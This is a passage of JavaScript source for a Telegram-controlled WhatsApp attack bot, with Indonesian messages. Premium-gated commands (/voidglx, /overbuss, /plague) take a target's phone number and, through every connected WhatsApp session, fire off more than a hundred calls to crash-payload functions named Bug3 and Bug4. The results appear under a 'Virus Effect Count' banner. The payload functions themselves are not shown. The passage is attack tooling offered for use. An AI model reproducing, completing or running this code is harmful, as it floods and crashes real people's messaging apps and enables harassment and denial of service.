      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│   𝐕𝐢𝐫𝐮𝐬 𝐄𝐟𝐟𝐞𝐜𝐭 𝐂𝐨𝐮𝐧𝐭
│────────────────
│✵ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${jid}
│✵ 𝐒𝐮𝐜𝐜𝐞𝐬 : ${successCount}
│✵ 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 : ${failCount}
│✵ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐫𝐞 : ${sessions.size}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
});
bot.onText(/\/voidglx (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim pesan ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│   𝐕𝐢𝐫𝐮𝐬 𝐄𝐟𝐟𝐞𝐜𝐭 𝐂𝐨𝐮𝐧𝐭
│────────────────
│✵ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${jid}
│✵ 𝐒𝐮𝐜𝐜𝐞𝐬 : ${successCount}
│✵ 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 : ${failCount}
│✵ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐫𝐞 : ${sessions.size}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
});
bot.onText(/\/overbuss (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim pesan ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│   𝐕𝐢𝐫𝐮𝐬 𝐄𝐟𝐟𝐞𝐜𝐭 𝐂𝐨𝐮𝐧𝐭
│────────────────
│✵ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${jid}
│✵ 𝐒𝐮𝐜𝐜𝐞𝐬 : ${successCount}
│✵ 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 : ${failCount}
│✵ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐫𝐞 : ${sessions.size}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
})
bot.onText(/\/plague (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim Notag ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│   𝐕𝐢𝐫𝐮𝐬 𝐄𝐟𝐟𝐞𝐜𝐭 𝐂𝐨𝐮𝐧𝐭
│────────────────
│✵ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${jid}
│✵ 𝐒𝐮𝐜𝐜𝐞𝐬 : ${successCount}
│✵ 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 : ${failCount}
│✵ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐫𝐞 : ${sessions.size}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
});

console.log("");
